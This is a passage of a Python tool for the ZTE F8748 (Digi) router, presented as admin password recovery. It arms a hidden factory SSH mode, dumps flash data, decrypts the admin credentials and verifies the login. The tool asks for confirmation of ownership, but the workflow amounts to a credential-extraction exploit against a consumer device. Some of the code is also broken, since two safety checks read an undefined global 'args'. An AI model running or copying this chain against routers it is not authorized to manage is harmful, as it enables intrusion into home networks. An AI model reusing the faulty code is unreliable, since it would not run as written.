            last = RuntimeError("empty credentials")
        except Exception as e:
            last = e
            log(f"[!] attempt {i} failed: {type(e).__name__}: {e}")
            time.sleep(2.0)
    raise last if last else RuntimeError("arm failed")


def cmd_arm(args) -> None:
    require_authorization("activar el diagnóstico de fábrica (arm)")
    w, fu, fp = arm_with_retries(args)
    log(f"[+] factory SSH armed — user: {fu}  pass: {fp}")
    if getattr(args, "save_creds", ""):
        p = Path(args.save_creds).expanduser()
        p.write_text(f"user={fu}\npass={fp}\n")
        os.chmod(p, 0o600)
        log(f"[+] credentials saved to {p} (0600)")
    if not getattr(args, "keep_ssh", False):
        log("[*] disarming (use --keep-ssh to leave it open)…")
        try:
            w.factory_mode(0, 1.2)
            log("[+] factory SSH disarmed")
        except Exception as e:
            log(f"[!] disarm failed ({e}) — reboot the router if port 22 stays open")


def warn_git_repo(path: Path) -> None:
    """Avisa si la carpeta de salida está dentro de un repo git: los volcados
    y credenciales del router nunca deben subirse a ningún repositorio."""
    p = path.resolve()
    for cand in [p, *p.parents]:
        if (cand / ".git").exists():
            print("[!] OJO: la carpeta de salida está dentro de un repositorio git.")
            print("    Los volcados y credenciales de tu router NO deben subirse nunca")
            print("    (añádelos al .gitignore o usa una carpeta fuera del repo).")
            break


def confirm_inside_git(path: Path) -> None:
    """Si la salida está en un repo git, exige confirmación aparte."""
    p = path.resolve()
    if not any((cand / ".git").exists() for cand in [p, *p.parents]):
        return
    warn_git_repo(p)
    if getattr(args, "yes", False):
        return
    if not sys.stdin.isatty():
        raise RuntimeError("la carpeta de salida está dentro de un repo git: "
                           "confírmalo en una terminal o usa -y")
    if input("¿Continuar de todos modos? [escribe SI] ").strip().upper() != "SI":
        raise RuntimeError("cancelado: no se volcará nada dentro de un repo git")


def require_authorization(what: str) -> None:
    """Endurece el uso autorizado: sin confirmación expresa no se activa
    el diagnóstico de fábrica."""
    if getattr(args, "yes", False):
        return
    if not sys.stdin.isatty():
        raise RuntimeError(f"para {what} se requiere confirmación interactiva "
                           "(ejecútalo en una terminal) o el flag -y")
    print(f"Vas a {what} en {args.host}.")
    print("Confirma que eres el propietario del router o que tienes autorización")
    print("expresa del propietario para gestionarlo.")
    if input("Escribe SI para continuar: ").strip().upper() != "SI":
        raise RuntimeError("cancelado por el usuario")


def cmd_dump(args) -> None:
    require_authorization("armar y volcar la flash del router (dump)")
    w, fu, fp = arm_with_retries(args)
    log(f"[+] factory SSH armado — user: {fu}  pass: {fp}")
    out_dir = Path(args.out).expanduser()
    confirm_inside_git(out_dir)
    try:
        results = dump_router(args.host, fu, fp, out_dir)
        log(f"[+] dump complete → {out_dir}")
        for k, v in results.items():
            log(f"    {k}: {v}")
    finally:
        if not getattr(args, "keep_ssh", False):
            log("[*] disarming factory SSH…")
            try:
                w.factory_mode(0, 1.2)
                log("[+] factory SSH disarmed")
            except Exception as e:
                log(f"[!] disarm failed ({e}) — reboot the router if port 22 stays open")


def cmd_decrypt(args) -> None:
    d = Path(args.dir).expanduser()
    seed_p = d / "hardcode.seed"
    oss_p = d / "oss.bin"
    pt_p = d / "paramtag.bin"
    for p in (seed_p, oss_p, pt_p):
        if not p.is_file():
            die(f"missing {p} — run 'dump' first")
    bt = d / "boardtype.txt"
    vid = ""
    if bt.is_file():
        m = re.search(r"vid\s*:\s*(\d+)", bt.read_text(errors="ignore"))
        vid = m.group(1) if m else ""
    vid = vid or args.vid or DEFAULT_VID
    log(f"[*] board vid: {vid}")
    creds = map_admin_credentials(seed_p, oss_p, pt_p, vid)
    log("== Admin credentials ==")
    log(f"  username: {creds['username']}   (source: {creds['user_source']})")
    log(f"  password: {creds['password']}   (source: {creds['pass_source']})")
    log(f"  oss keys : {', '.join(creds['oss_keys'])}")
    log(f"  paramtag : {', '.join(hex(i) for i in creds['paramtag_ids'])}")


def cmd_verify(args) -> None:
    res = verify_web_admin(args.host, args.user, args.password)
    log(json.dumps(res, indent=2))
    if res.get("ok"):
        log("[+] web admin login confirmed (curRight=1)")
    else:
        log("[!] web admin login NOT confirmed")


def cmd_disarm(args) -> None:
    br0, cli = resolve_macs(args)
    w = WebFac(args.host, args.web_user, args.web_pass, args.client_rand)
    w.handshake()
    w.mac_proof(br0, cli)
    w.login()
    w.factory_mode(0, 1.2)
    log("[+] factory SSH disarmed")


def cmd_recover(args) -> None:
    require_authorization("ejecutar la recuperación completa (recover)")
    work = Path(args.out).expanduser()
    confirm_inside_git(work)
    warn_git_repo(work)
    log(f"== {TOOL} v{VERSION} — full recovery on {args.host} ==")
    w, fu, fp = arm_with_retries(args)
    log(f"[+] factory SSH armed — user: {fu}  pass: {fp}")
    try:
        results = dump_router(args.host, fu, fp, work)
        needed = ("seed", "oss", "paramtag")
        missing = [k for k in needed if k not in results]
        if missing:
            raise RuntimeError(f"data collection incomplete (missing {', '.join(missing)})")
        vid = results.get("vid") or ""
        if not vid:
            bt = work / "boardtype.txt"
            m = re.search(r"vid\s*:\s*(\d+)", bt.read_text(errors="ignore")) if bt.is_file() else None
            vid = m.group(1) if m else DEFAULT_VID
        creds = map_admin_credentials(work / "hardcode.seed", work / "oss.bin",
                                      work / "paramtag.bin", vid)
        log("== Admin credentials ==")
        log(f"  username: {creds['username']}   (source: {creds['user_source']})")
        log(f"  password: {creds['password']}   (source: {creds['pass_source']})")
        if not args.no_verify:
            log("[*] confirming web admin login…")
            res = verify_web_admin(args.host, creds["username"], creds["password"])
            log("[+] web admin login confirmed (curRight=1)" if res.get("ok")
                else f"[!] login not confirmed: {res}")
    finally:
        log("[*] closing temporary access…")
        try:
            w.factory_mode(0, 1.2)
            log("[+] factory SSH disarmed")
        except Exception as e:
            log(f"[!] disarm failed ({e}) — reboot the router if port 22 stays open")


BANNER = r"""
 ____ ___ ____ ___
|  _ \_ _/ ___|_ _|
| | | | | |  _ | |
| |_| | | |_| || |
|____/___\____|___|
  ZTE F8748 (Digi) - ADMIN RECOVERY - solo uso autorizado
"""


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(prog=TOOL,
                                 description=f"{TOOL} v{VERSION} — recuperador de la contraseña de administrador para el ZTE F8748 (Digi). Si estás aquí, es que la has perdido.")
    ap.add_argument("--version", action="version", version=f"{TOOL} {VERSION}")
    sub = ap.add_subparsers(dest="cmd", required=True)

    p = sub.add_parser("info", help="router model/firmware + LAN MACs")
    common_args(p)
    p.set_defaults(fn=cmd_info)

    p = sub.add_parser("handshake", help="webFac challenge + MAC proof (dry unless --send-proof)")
    common_args(p)
    p.add_argument("--router-mac", default="", help="router br0 MAC")
    p.add_argument("--client-mac", default="", help="your MAC as the router sees it")
    p.add_argument("--send-proof", action="store_true", help="actually send the proof message")
    p.set_defaults(fn=cmd_handshake)

    p = sub.add_parser("arm", help="arm factory SSH and print temporary credentials")
    common_args(p)
    p.add_argument("--router-mac", default="")
    p.add_argument("--client-mac", default="")
    p.add_argument("--save-creds", default="", help="save SSH creds to this 0600 file")
    p.add_argument("--keep-ssh", action="store_true", help="leave factory SSH open")
    p.set_defaults(fn=cmd_arm)

    p = sub.add_parser("dump", help="arm + pull seed/oss/paramtag/boardtype into --out dir")
    common_args(p)
    p.add_argument("--router-mac", default="")
    p.add_argument("--client-mac", default="")
    p.add_argument("--out", default="digi-dump", help="output directory")
    p.add_argument("--keep-ssh", action="store_true")
    p.set_defaults(fn=cmd_dump)

    p = sub.add_parser("decrypt", help="offline: dump dir → admin credentials")
    p.add_argument("--dir", default="digi-dump", help="dump directory")
    p.add_argument("--vid", default="", help="board vid override (default: boardtype.txt or 108)")
    p.set_defaults(fn=cmd_decrypt)

    p = sub.add_parser("verify", help="test web admin login")
    common_args(p)
    p.add_argument("-U", "--user", required=True, dest="user")
    p.add_argument("-W", "--password", required=True, dest="password")
    p.set_defaults(fn=cmd_verify)

    p = sub.add_parser("disarm", help="close factory SSH")
    common_args(p)
    p.add_argument("--router-mac", default="")
    p.add_argument("--client-mac", default="")
    p.set_defaults(fn=cmd_disarm)

    p = sub.add_parser("recover", help="arm → dump → decrypt → verify → disarm")
    common_args(p)
    p.add_argument("--router-mac", default="")
    p.add_argument("--client-mac", default="")
    p.add_argument("--out", default="digi-dump", help="output directory")
    p.add_argument("--no-verify", action="store_true")
    p.set_defaults(fn=cmd_recover)

    args = ap.parse_args(argv)
    validate_host(args.host)
    try:
        args.fn(args)
    except KeyboardInterrupt:
        print("\n[!] interrupted — run 'disarm' to close factory SSH if it was armed")
        return 130
    except (RuntimeError, ValueError) as e:
        print(f"[x] {e}")
        return 1
    except requests.exceptions.RequestException as e:
        print(f"[x] error de red hablando con el router: {e}")
        print("    Si el router no responde a nada, apágalo y enciéndelo, espera dos")
        print("    minutos y vuelve a intentarlo una sola vez.")
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
